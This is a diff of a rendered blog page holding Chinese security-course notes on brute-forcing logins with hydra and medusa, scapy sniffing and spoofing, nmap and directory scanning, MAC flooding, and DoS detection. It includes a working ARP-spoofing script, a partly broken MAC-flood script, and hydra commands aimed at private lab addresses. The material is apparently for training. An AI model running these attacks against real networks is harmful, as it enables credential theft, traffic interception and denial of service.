@@ -484,7 +484,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    1.3k
+                    996
                 </div>
                 
 
@@ -506,241 +506,356 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
-### 加密解密实战
-
-1. `base64`编码
-2. 哈希算法：不可逆
-3. 凯撒密码
-
-### 模拟勒索病毒
-
-1. `base64`编码再加密
-2. `wnana cry`
-
-### 质数因子求解
-
-### RSA与AES解密
-
-1. `https:` SHA,RSA,AES
-2. 对称加密：AES,DES,RC5
-
+                <h3 id="加密解密实战">加密解密实战</h3>
+<ol type="1">
+<li><code>base64</code>编码</li>
+<li>哈希算法：不可逆</li>
+<li>凯撒密码</li>
+</ol>
+<h3 id="模拟勒索病毒">模拟勒索病毒</h3>
+<ol type="1">
+<li><code>base64</code>编码再加密</li>
+<li><code>wnana cry</code></li>
+</ol>
+<h3 id="质数因子求解">质数因子求解</h3>
+<h3 id="rsa与aes解密">RSA与AES解密</h3>
+<ol type="1">
+<li><code>https:</code> SHA,RSA,AES</li>
+<li>对称加密：AES,DES,RC5</li>
+</ol>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果下载了多个密码学库，则卸载所有，安装最新的一个 </span></span><br><span class="line">pip uninstall crypto </span><br><span class="line">pip uninstall pycryptodome</span><br><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure>
-
-### 爆破woniusales系统
-
-1. 爆破md5
-1. 多线程
-
-> 1. 一线程一用户
-> 2. 一线程多用户
-
-3. 工具
-
-> 1. `hydra`
-
+<h3 id="爆破woniusales系统">爆破woniusales系统</h3>
+<ol type="1">
+<li>爆破md5</li>
+<li>多线程</li>
+</ol>
+<blockquote>
+<ol type="1">
+<li>一线程一用户</li>
+<li>一线程多用户</li>
+</ol>
+</blockquote>
+<ol start="3" type="1">
+<li>工具</li>
+</ol>
+<blockquote>
+<ol type="1">
+<li><code>hydra</code></li>
+</ol>
+</blockquote>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -h</span><br><span class="line"></span><br><span class="line">hydra -s 8080 -l admin -P ./password-3000.txt 192.168.112.130 -m <span class="string">&quot;/woniusales/user/login:username=^USER^&amp;password=^PASS^&amp;verifycode=0000:login-fail&quot;</span> http-form-post</span><br></pre></td></tr></table></figure>
-
-![hydra](https://s2.loli.net/2022/08/08/k8tY97DIjx4wiRZ.png)
-
+<figure>
+<img src="https://s2.loli.net/2022/08/08/k8tY97DIjx4wiRZ.png"
+alt="hydra" />
+<figcaption aria-hidden="true">hydra</figcaption>
+</figure>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P ./password-3000.txt -vV -o ssh.log -e ns 192.168.112.118 ssh</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 192.168.112.188 -u root -p ./password-3000.txt -t 200 -M ssh</span><br></pre></td></tr></table></figure>
-
-> 2. `medusa`
-
-![medusa](https://s2.loli.net/2022/08/12/8aCiMbTq1ZXrKlN.png)
-
-> 3. 字典生成工具 `crunch`
-> 4. `du -sh`命令
-
-### python 扫描可用端口
-
-1. 尝试连接目标ip和端口（socket）
-
-### python扫描ip地址
-
-1. 使用`ping`, `import os`
-
+<blockquote>
+<ol start="2" type="1">
+<li><code>medusa</code></li>
+</ol>
+</blockquote>
+<figure>
+<img src="https://s2.loli.net/2022/08/12/8aCiMbTq1ZXrKlN.png"
+alt="medusa" />
+<figcaption aria-hidden="true">medusa</figcaption>
+</figure>
+<blockquote>
+<ol start="3" type="1">
+<li>字典生成工具 <code>crunch</code></li>
+<li><code>du -sh</code>命令</li>
+</ol>
+</blockquote>
+<h3 id="python-扫描可用端口">python 扫描可用端口</h3>
+<ol type="1">
+<li>尝试连接目标ip和端口（socket）</li>
+</ol>
+<h3 id="python扫描ip地址">python扫描ip地址</h3>
+<ol type="1">
+<li>使用<code>ping</code>, <code>import os</code></li>
+</ol>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping ......| findstr TTL</span><br></pre></td></tr></table></figure>
-
-> 注意防火墙
-
-### scapy: kali 上也有
-
-1. 监听流量、分析流量、编辑流量数据包（链路层、网络层、传输层
-
+<blockquote>
+<p>注意防火墙</p>
+</blockquote>
+<h3 id="scapy-kali-上也有">scapy: kali 上也有</h3>
+<ol type="1">
+<li>监听流量、分析流量、编辑流量数据包（链路层、网络层、传输层</li>
+</ol>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show_interfaces()</span><br><span class="line">pack=sniff(count=<span class="number">10</span>,iface=<span class="string">&#x27;VMware Virtual Ethernet Adapter for VMnet8&#x27;</span>)</span><br><span class="line">pack[<span class="number">0</span>].show()</span><br></pre></td></tr></table></figure>
-
-![image-20220809202221278](https://s2.loli.net/2022/08/12/qHMoxSUEKaYcXRN.png)
-
+<figure>
+<img src="https://s2.loli.net/2022/08/12/qHMoxSUEKaYcXRN.png"
+alt="image-20220809202221278" />
+<figcaption aria-hidden="true">image-20220809202221278</figcaption>
+</figure>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pack.summary()</span><br></pre></td></tr></table></figure>
-
-![image-20220809203824463](https://s2.loli.net/2022/08/09/1LFsnJxogDHByfq.png)
-
-​	
-
+<figure>
+<img src="https://s2.loli.net/2022/08/09/1LFsnJxogDHByfq.png"
+alt="image-20220809203824463" />
+<figcaption aria-hidden="true">image-20220809203824463</figcaption>
+</figure>
+<p>​</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send(IP(dst=<span class="string">&quot;192.168.104.129&quot;</span>)/ICMP())</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 带载荷</span></span><br><span class="line">send(IP(dst=<span class="string">&quot;192.168.104.129&quot;</span>)/ICMP()/<span class="string">&quot;HHHHHHHHHHHHHH&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-​	
-
+<p>​</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send(IP(dst=<span class="string">&quot;192.168.104.129&quot;</span>)/ICMP()/<span class="string">&quot;HHHHHHHH&quot;</span>,inter=<span class="number">1</span>,count=<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg=sr1(IP(dst=<span class="string">&quot;192.168.104.129&quot;</span>)/ICMP()/<span class="string">&quot;HHHHHHHHHJH&quot;</span>)</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IP().show()</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pkg = IP(dst=<span class="string">&#x27;192.168.104.129&#x27;</span>)/TCP(dport=<span class="number">22</span>)</span><br><span class="line">sr1(pkg)</span><br></pre></td></tr></table></figure>
-
-![image-20220809224546860](https://s2.loli.net/2022/08/12/78QAoSVuz1Ihv2E.png)
-
-> python `ip欺骗`
-
-![image-20220809225218540](https://s2.loli.net/2022/08/09/ytXr9K351qf7bMO.png)
-
-2. py 模拟三次握手
-
-![image-20220810160403719](https://s2.loli.net/2022/08/10/b7xqpc8rdoZBSgm.png)
-
-![image-20220810160425563](https://s2.loli.net/2022/08/10/O8eyBCP5vwjmsdk.png)
-
-![image-20220810160144705](https://s2.loli.net/2022/08/10/2JTyi5g1UbEuPxQ.png)
-
-### nmap
-
+<figure>
+<img src="https://s2.loli.net/2022/08/12/78QAoSVuz1Ihv2E.png"
+alt="image-20220809224546860" />
+<figcaption aria-hidden="true">image-20220809224546860</figcaption>
+</figure>
+<blockquote>
+<p>python <code>ip欺骗</code></p>
+</blockquote>
+<figure>
+<img src="https://s2.loli.net/2022/08/09/ytXr9K351qf7bMO.png"
+alt="image-20220809225218540" />
+<figcaption aria-hidden="true">image-20220809225218540</figcaption>
+</figure>
+<ol start="2" type="1">
+<li>py 模拟三次握手</li>
+</ol>
+<figure>
+<img src="https://s2.loli.net/2022/08/10/b7xqpc8rdoZBSgm.png"
+alt="image-20220810160403719" />
+<figcaption aria-hidden="true">image-20220810160403719</figcaption>
+</figure>
+<figure>
+<img src="https://s2.loli.net/2022/08/10/O8eyBCP5vwjmsdk.png"
+alt="image-20220810160425563" />
+<figcaption aria-hidden="true">image-20220810160425563</figcaption>
+</figure>
+<figure>
+<img src="https://s2.loli.net/2022/08/10/2JTyi5g1UbEuPxQ.png"
+alt="image-20220810160144705" />
+<figcaption aria-hidden="true">image-20220810160144705</figcaption>
+</figure>
+<h3 id="nmap">nmap</h3>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 网段/地址范围</span><br></pre></td></tr></table></figure>
-
-![image-20220810164036582](https://s2.loli.net/2022/08/10/LKekJzNAhCGtsrB.png)
-
-![image-20220810165955081](https://s2.loli.net/2022/08/12/yBxKPcnDYeg7SJh.png)
-
-![image-20220810173601244](https://s2.loli.net/2022/08/12/kJiayMhHScPpbYr.png)
-
-- 绕过防火墙
-
-### 子域名和后台扫描
-
-1. layer子域挖掘机（`windows`
-2. dnsenum(`kali`)
-
-![image-20220810182403401](https://s2.loli.net/2022/08/10/aHpRun7MTmSG4tv.png)
-
-![image-20220810182442749](https://s2.loli.net/2022/08/12/gZeO9Ruphqy8vnw.png)
-
-1. 后台扫描(扫描网站文件、目录)
-
-> - 御剑
-
-> - `dirbuster`
-
-![image-20220810202520815](https://s2.loli.net/2022/08/10/ORfEi3pCkzYvdLr.png)
-
-![https://s2.loli.net/2022/08/10/qxBl9fLwybZpCa3.png](https://s2.loli.net/2022/08/10/qxBl9fLwybZpCa3.png)
-
-![image-20220810201838607](https://s2.loli.net/2022/08/10/dyBRc79oq6kzsKI.png)
-
-
-
-![image-20220810201733159](https://s2.loli.net/2022/08/10/LjMRVGwWNOsg6mh.png)
-
-![image-20220810201939575](https://s2.loli.net/2022/08/10/3mUzByLHh6f5MtN.png)
-
-### web站点信息采集
-
-![https://s2.loli.net/2022/08/10/mVazoqSvWjLy3uE.png](https://s2.loli.net/2022/08/10/mVazoqSvWjLy3uE.png)
-
-![image-20220810203827981](https://s2.loli.net/2022/08/10/XG2rzkRtsujADVy.png)
-
+<figure>
+<img src="https://s2.loli.net/2022/08/10/LKekJzNAhCGtsrB.png"
+alt="image-20220810164036582" />
+<figcaption aria-hidden="true">image-20220810164036582</figcaption>
+</figure>
+<figure>
+<img src="https://s2.loli.net/2022/08/12/yBxKPcnDYeg7SJh.png"
+alt="image-20220810165955081" />
+<figcaption aria-hidden="true">image-20220810165955081</figcaption>
+</figure>
+<figure>
+<img src="https://s2.loli.net/2022/08/12/kJiayMhHScPpbYr.png"
+alt="image-20220810173601244" />
+<figcaption aria-hidden="true">image-20220810173601244</figcaption>
+</figure>
+<ul>
+<li>绕过防火墙</li>
+</ul>
+<h3 id="子域名和后台扫描">子域名和后台扫描</h3>
+<ol type="1">
+<li>layer子域挖掘机（<code>windows</code></li>
+<li>dnsenum(<code>kali</code>)</li>
+</ol>
+<figure>
+<img src="https://s2.loli.net/2022/08/10/aHpRun7MTmSG4tv.png"
+alt="image-20220810182403401" />
+<figcaption aria-hidden="true">image-20220810182403401</figcaption>
+</figure>
+<figure>
+<img src="https://s2.loli.net/2022/08/12/gZeO9Ruphqy8vnw.png"
+alt="image-20220810182442749" />
+<figcaption aria-hidden="true">image-20220810182442749</figcaption>
+</figure>
+<ol type="1">
+<li>后台扫描(扫描网站文件、目录)</li>
+</ol>
+<blockquote>
+<ul>
+<li>御剑</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li><code>dirbuster</code></li>
+</ul>
+</blockquote>
+<figure>
+<img src="https://s2.loli.net/2022/08/10/ORfEi3pCkzYvdLr.png"
+alt="image-20220810202520815" />
+<figcaption aria-hidden="true">image-20220810202520815</figcaption>
+</figure>
+<figure>
+<img src="https://s2.loli.net/2022/08/10/qxBl9fLwybZpCa3.png"
+alt="https://s2.loli.net/2022/08/10/qxBl9fLwybZpCa3.png" />
+<figcaption
+aria-hidden="true">https://s2.loli.net/2022/08/10/qxBl9fLwybZpCa3.png</figcaption>
+</figure>
+<figure>
+<img src="https://s2.loli.net/2022/08/10/dyBRc79oq6kzsKI.png"
+alt="image-20220810201838607" />
+<figcaption aria-hidden="true">image-20220810201838607</figcaption>
+</figure>
+<figure>
+<img src="https://s2.loli.net/2022/08/10/LjMRVGwWNOsg6mh.png"
+alt="image-20220810201733159" />
+<figcaption aria-hidden="true">image-20220810201733159</figcaption>
+</figure>
+<figure>
+<img src="https://s2.loli.net/2022/08/10/3mUzByLHh6f5MtN.png"
+alt="image-20220810201939575" />
+<figcaption aria-hidden="true">image-20220810201939575</figcaption>
+</figure>
+<h3 id="web站点信息采集">web站点信息采集</h3>
+<figure>
+<img src="https://s2.loli.net/2022/08/10/mVazoqSvWjLy3uE.png"
+alt="https://s2.loli.net/2022/08/10/mVazoqSvWjLy3uE.png" />
+<figcaption
+aria-hidden="true">https://s2.loli.net/2022/08/10/mVazoqSvWjLy3uE.png</figcaption>
+</figure>
+<figure>
+<img src="https://s2.loli.net/2022/08/10/XG2rzkRtsujADVy.png"
+alt="image-20220810203827981" />
+<figcaption aria-hidden="true">image-20220810203827981</figcaption>
+</figure>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pyton-whois 库</span></span><br><span class="line"><span class="keyword">from</span> whois <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whois_info</span>():</span><br><span class="line">    result = whois(<span class="string">&#x27;woniuxy.com&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
-
-![nslookup](https://s2.loli.net/2022/08/10/LYZBXAivP91wjdb.png)
-
-> `cdn`: 多个ip
-
-> `fafa.so`搜索引擎：[click](https://fofa.info/toLogin)
-
->[shodan](https://www.shodan.io/)
-
-### 泛洪
-
-1. TCP_land
-
-> - 源地址和目标地址相同
-> - 反射型攻击
-> - ICMP广播
-> - ping 命令泛洪
-> - MAC地址泛洪
-
+<figure>
+<img src="https://s2.loli.net/2022/08/10/LYZBXAivP91wjdb.png"
+alt="nslookup" />
+<figcaption aria-hidden="true">nslookup</figcaption>
+</figure>
+<blockquote>
+<p><code>cdn</code>: 多个ip</p>
+</blockquote>
+<blockquote>
+<p><code>fafa.so</code>搜索引擎：<a
+target="_blank" rel="noopener" href="https://fofa.info/toLogin">click</a></p>
+</blockquote>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.shodan.io/">shodan</a></p>
+</blockquote>
+<h3 id="泛洪">泛洪</h3>
+<ol type="1">
+<li>TCP_land</li>
+</ol>
+<blockquote>
+<ul>
+<li>源地址和目标地址相同</li>
+<li>反射型攻击</li>
+<li>ICMP广播</li>
+<li>ping 命令泛洪</li>
+<li>MAC地址泛洪</li>
+</ul>
+</blockquote>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali:macof</span><br></pre></td></tr></table></figure>
-
-
-
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> randmac</span><br><span class="line"><span class="keyword">from</span> scapy.layers.l2 <span class="keyword">import</span> Ether</span><br><span class="line"><span class="keyword">from</span> scapy.volatile <span class="keyword">import</span> RandMAC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mac_flood</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        randMac = RandMAC(<span class="string">&quot;*:*:*:*&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(randMac)</span><br><span class="line"></span><br><span class="line">        srandip = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>)&#125;</span>&quot;</span></span><br><span class="line">        drandip = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>)&#125;</span>&quot;</span></span><br><span class="line">        packet = Ether(src=randMac, dst=randMac)/IP(src=srandip, dst=drandip)</span><br><span class="line">        sendp(packet, iface=<span class="string">&quot;网卡名称&quot;</span>, loop=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-2. `vmWare`中的混杂模式
-
+<ol start="2" type="1">
+<li><code>vmWare</code>中的混杂模式</li>
+</ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ethernet0.noPromsic = &quot;TRUE&quot;    # 禁用</span><br></pre></td></tr></table></figure>
-
-### ARP攻击与欺骗
-
+<h3 id="arp攻击与欺骗">ARP攻击与欺骗</h3>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root -n  <span class="comment"># 查看网关</span></span><br></pre></td></tr></table></figure>
-
-> - kali (.129)攻击 win10(.131)
-
-![image-20220811153941380](https://s2.loli.net/2022/08/11/pI9W4N3KzcgASnY.png)
-
-![image-20220811155511118](https://s2.loli.net/2022/08/12/FsxaVymDh6PMvWU.png)
-
-![https://s2.loli.net/2022/08/11/mOpiLMtr3lVjbe6.png](https://s2.loli.net/2022/08/11/mOpiLMtr3lVjbe6.png)
-
-![image-20220811161453521](https://s2.loli.net/2022/08/11/H8QFqMz3tPup1Jb.png)
-
-> - kali 上开启ipv4 转发
-
-> `driftnet`: 从发过来的流量中捕获图像并显示
-
+<blockquote>
+<ul>
+<li>kali (.129)攻击 win10(.131)</li>
+</ul>
+</blockquote>
+<figure>
+<img src="https://s2.loli.net/2022/08/11/pI9W4N3KzcgASnY.png"
+alt="image-20220811153941380" />
+<figcaption aria-hidden="true">image-20220811153941380</figcaption>
+</figure>
+<figure>
+<img src="https://s2.loli.net/2022/08/12/FsxaVymDh6PMvWU.png"
+alt="image-20220811155511118" />
+<figcaption aria-hidden="true">image-20220811155511118</figcaption>
+</figure>
+<figure>
+<img src="https://s2.loli.net/2022/08/11/mOpiLMtr3lVjbe6.png"
+alt="https://s2.loli.net/2022/08/11/mOpiLMtr3lVjbe6.png" />
+<figcaption
+aria-hidden="true">https://s2.loli.net/2022/08/11/mOpiLMtr3lVjbe6.png</figcaption>
+</figure>
+<figure>
+<img src="https://s2.loli.net/2022/08/11/H8QFqMz3tPup1Jb.png"
+alt="image-20220811161453521" />
+<figcaption aria-hidden="true">image-20220811161453521</figcaption>
+</figure>
+<blockquote>
+<ul>
+<li>kali 上开启ipv4 转发</li>
+</ul>
+</blockquote>
+<blockquote>
+<p><code>driftnet</code>: 从发过来的流量中捕获图像并显示</p>
+</blockquote>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.sendrecv <span class="keyword">import</span> sendp</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> randmac</span><br><span class="line"><span class="keyword">from</span> scapy.layers.l2 <span class="keyword">import</span> Ether, ARP</span><br><span class="line"><span class="keyword">from</span> scapy.volatile <span class="keyword">import</span> RandMAC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mac_flood</span>():</span><br><span class="line">     <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        randMac = RandMAC(<span class="string">&quot;*:*:*:*&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(randMac)</span><br><span class="line"></span><br><span class="line">        srandip = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>)&#125;</span>&quot;</span></span><br><span class="line">        drandip = <span class="string">f&quot;<span class="subst">&#123;random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>).random.randint(<span class="number">1</span>, <span class="number">254</span>)&#125;</span>&quot;</span></span><br><span class="line">        packet = Ether(src=randMac, dst=randMac)/IP(src=srandip, dst=drandip)</span><br><span class="line">        sendp(packet, iface=<span class="string">&quot;网卡名称&quot;</span>, loop=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_spoof</span>():</span><br><span class="line">    iface = <span class="string">&quot;VMware Virtual Ethernet Adapter for VMnet8&quot;</span></span><br><span class="line">    <span class="comment"># 被攻击主机</span></span><br><span class="line">    target_ip = <span class="string">&#x27;192.168.104.131&#x27;</span></span><br><span class="line">    target_mac = <span class="string">&#x27;00:0C:29:E0:9C:B3&#x27;</span>		<span class="comment"># 网卡用“:”</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 被攻击主机的MAC和IP,kali</span></span><br><span class="line">    spoof_ip = <span class="string">&#x27;192.168.104.129&#x27;</span></span><br><span class="line">    spoof_mac = <span class="string">&#x27;00:0c:29:8e:52:c1&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 真实网关的MAC和IP</span></span><br><span class="line">    gateway_ip = <span class="string">&#x27;192.168.104.2&#x27;</span></span><br><span class="line">    gateway_mac = <span class="string">&#x27;00:50:56:ea:a2:db&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        packet = Ether(src=spoof_mac, dst=target_mac)/ARP(hwsrc=spoof_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip, op=<span class="number">2</span>)</span><br><span class="line">        sendp(packet,iface=iface)</span><br><span class="line"></span><br><span class="line">        packet = Ether(src=spoof_mac, dst=gateway_mac)/ARP(hwsrc=spoof_mac, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip, op=<span class="number">2</span>)</span><br><span class="line">        sendp(packet, iface=iface)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    arp_spoof()</span><br></pre></td></tr></table></figure>
-
-​		
-
-### hping3和wrk泛洪
-
-1. SYN + 随机ip
-
-![image-20220811172734840](https://s2.loli.net/2022/08/11/H7uD8xkYnr65Oqo.png)
-
-![image-20220811172806308](https://s2.loli.net/2022/08/11/KSL5cizrWV91DdF.png)
-
-![image-20220811173548351](https://s2.loli.net/2022/08/11/hzZOlCFUPA56rvq.png)
-
-2. web压力测试
-
-> - `ab`
-> - `wrk`
-
-### CentOs一些命令
-
+<p>​</p>
+<h3 id="hping3和wrk泛洪">hping3和wrk泛洪</h3>
+<ol type="1">
+<li>SYN + 随机ip</li>
+</ol>
+<figure>
+<img src="https://s2.loli.net/2022/08/11/H7uD8xkYnr65Oqo.png"
+alt="image-20220811172734840" />
+<figcaption aria-hidden="true">image-20220811172734840</figcaption>
+</figure>
+<figure>
+<img src="https://s2.loli.net/2022/08/11/KSL5cizrWV91DdF.png"
+alt="image-20220811172806308" />
+<figcaption aria-hidden="true">image-20220811172806308</figcaption>
+</figure>
+<figure>
+<img src="https://s2.loli.net/2022/08/11/hzZOlCFUPA56rvq.png"
+alt="image-20220811173548351" />
+<figcaption aria-hidden="true">image-20220811173548351</figcaption>
+</figure>
+<ol start="2" type="1">
+<li>web压力测试</li>
+</ol>
+<blockquote>
+<ul>
+<li><code>ab</code></li>
+<li><code>wrk</code></li>
+</ul>
+</blockquote>
+<h3 id="centos一些命令">CentOs一些命令</h3>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uptime</span></span><br><span class="line">netstat -anutl</span><br><span class="line">firewall-cmd --add-port=80/tcp</span><br><span class="line">ss</span><br></pre></td></tr></table></figure>
-
-
-
-![https://s2.loli.net/2022/08/11/hzZOlCFUPA56rvq.png](https://s2.loli.net/2022/08/11/hzZOlCFUPA56rvq.png)
-
-### python检测和抵御dos攻击
-
-![image-20220812143724224](https://s2.loli.net/2022/08/12/AqGsuyr3SOK8fh6.png)
-
-![image-20220812143802500](https://s2.loli.net/2022/08/12/pZB6KX9ozHTuAbS.png)
-
-- 找出出现频率最高的ip
-
-![image-20220812155252174](https://s2.loli.net/2022/08/12/ohUpDuABsId8QmV.png)
-
-![image-20220812155722065](https://s2.loli.net/2022/08/12/QsnUewD83rBGutj.png)
-
-- `firewall-cmd命令`禁止该ip访问端口
+<figure>
+<img src="https://s2.loli.net/2022/08/11/hzZOlCFUPA56rvq.png"
+alt="https://s2.loli.net/2022/08/11/hzZOlCFUPA56rvq.png" />
+<figcaption
+aria-hidden="true">https://s2.loli.net/2022/08/11/hzZOlCFUPA56rvq.png</figcaption>
+</figure>
+<h3 id="python检测和抵御dos攻击">python检测和抵御dos攻击</h3>
+<figure>
+<img src="https://s2.loli.net/2022/08/12/AqGsuyr3SOK8fh6.png"
+alt="image-20220812143724224" />
+<figcaption aria-hidden="true">image-20220812143724224</figcaption>
+</figure>
+<figure>
+<img src="https://s2.loli.net/2022/08/12/pZB6KX9ozHTuAbS.png"
+alt="image-20220812143802500" />
+<figcaption aria-hidden="true">image-20220812143802500</figcaption>
+</figure>
+<ul>
+<li>找出出现频率最高的ip</li>
+</ul>
+<figure>
+<img src="https://s2.loli.net/2022/08/12/ohUpDuABsId8QmV.png"
+alt="image-20220812155252174" />
+<figcaption aria-hidden="true">image-20220812155252174</figcaption>
+</figure>
+<figure>
+<img src="https://s2.loli.net/2022/08/12/QsnUewD83rBGutj.png"
+alt="image-20220812155722065" />
+<figcaption aria-hidden="true">image-20220812155722065</figcaption>
+</figure>
+<ul>
+<li><code>firewall-cmd命令</code>禁止该ip访问端口</li>
+</ul>
 
                 
             </div>
@@ -1235,7 +1350,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">51.9k</span>&nbsp;字
+                class="white-color">48.4k</span>&nbsp;字
             
             
             
